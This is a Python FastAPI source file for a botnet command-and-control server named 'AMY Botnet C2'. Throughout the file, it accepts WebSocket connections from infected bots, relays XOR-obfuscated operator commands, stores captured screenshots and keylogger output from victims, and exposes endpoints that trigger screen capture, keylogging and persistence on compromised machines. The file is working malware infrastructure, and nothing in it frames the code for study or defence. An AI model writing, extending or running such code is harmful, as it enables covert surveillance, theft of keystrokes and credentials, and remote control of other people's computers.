from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import asyncio
import base64
import os
from datetime import datetime
from pathlib import Path

app = FastAPI(title="AMY Botnet C2")

# Налаштування CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Setup base directory
BASE_DIR = Path(__file__).resolve().parent.parent
UI_DIR = BASE_DIR / "ui"
UI_PATH = UI_DIR / "index.html"

# Storage
os.makedirs(BASE_DIR / "screenshots", exist_ok=True)
os.makedirs(BASE_DIR / "logs", exist_ok=True)

# Active connections
active_bots = {}  # bot_id -> WebSocket (bot connection)
terminal_sessions = {}  # bot_id -> set(WebSocket) (UI connections)

KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"

def encrypt_message(msg: str) -> str:
    encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(msg.encode('utf-8'))])
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_message(encoded: str) -> str:
    try:
        encrypted = base64.b64decode(encoded)
        decrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(encrypted)])
        return decrypted.decode('utf-8', errors='ignore')
    except Exception:
        return ""

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    if UI_PATH.exists():
        return UI_PATH.read_text(encoding="utf-8")
    return HTMLResponse(content="UI file not found. Check if 'ui/index.html' exists.", status_code=404)

# Endpoint for the BOT to connect
@app.websocket("/ws/{bot_id}")
async def bot_connection(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    active_bots[bot_id] = websocket
    print(f"[+] Bot {bot_id} connected")
    try:
        while True:
            encrypted_data = await websocket.receive_text()
            data = decrypt_message(encrypted_data)
            
            if data.startswith("SCREENSHOT:"):
                img_data = base64.b64decode(data[11:])
                filename = BASE_DIR / "screenshots" / f"{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                with open(filename, "wb") as f:
                    f.write(img_data)
                await broadcast_to_terminals(bot_id, f"[SYSTEM] Screenshot saved to {filename.name}")
            
            elif data.startswith("KEYLOG:"):
                log_file = BASE_DIR / "logs" / f"{bot_id}_keylog.txt"
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write(data[7:] + "\n")
                await broadcast_to_terminals(bot_id, f"[KEYLOG] {data[7:]}")
            
            else:
                # Forward generic output to UI terminals
                await broadcast_to_terminals(bot_id, data)
                
    except WebSocketDisconnect:
        print(f"[-] Bot {bot_id} disconnected")
        active_bots.pop(bot_id, None)
        await broadcast_to_terminals(bot_id, f"[SYSTEM] Bot disconnected.")

# Endpoint for the UI Terminal to connect
@app.websocket("/terminal/{bot_id}")
async def terminal_connection(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    if bot_id not in terminal_sessions:
        terminal_sessions[bot_id] = set()
    terminal_sessions[bot_id].add(websocket)
    
    try:
        while True:
            # Receive command from UI
            command = await websocket.receive_text()
            if bot_id in active_bots:
                # Forward command to Bot
                await active_bots[bot_id].send_text(encrypt_message(command))
            else:
                await websocket.send_text(f"Error: Bot {bot_id} is offline.")
    except WebSocketDisconnect:
        terminal_sessions[bot_id].remove(websocket)

async def broadcast_to_terminals(bot_id: str, message: str):
    if bot_id in terminal_sessions:
        disconnected = set()
        for ws in terminal_sessions[bot_id]:
            try:
                await ws.send_text(message)
            except:
                disconnected.add(ws)
        for ws in disconnected:
            terminal_sessions[bot_id].remove(ws)

@app.get("/bots")
async def list_bots():
    return {"bots": list(active_bots.keys())}

@app.get("/screenshot/{bot_id}")
async def trigger_screenshot(bot_id: str):
    if bot_id in active_bots:
        await active_bots[bot_id].send_text(encrypt_message("screenshot"))
        return {"status": "triggered"}
    return JSONResponse(content={"error": "Bot offline"}, status_code=404)

@app.get("/keylogger/{bot_id}")
async def trigger_keylogger(bot_id: str):
    if bot_id in active_bots:
        await active_bots[bot_id].send_text(encrypt_message("keylogger"))
        return {"status": "triggered"}
    return JSONResponse(content={"error": "Bot offline"}, status_code=404)

@app.get("/persistence/{bot_id}")
async def trigger_persistence(bot_id: str):
    if bot_id in active_bots:
        await active_bots[bot_id].send_text(encrypt_message("persistence"))
        return {"status": "triggered"}
    return JSONResponse(content={"error": "Bot offline"}, status_code=404)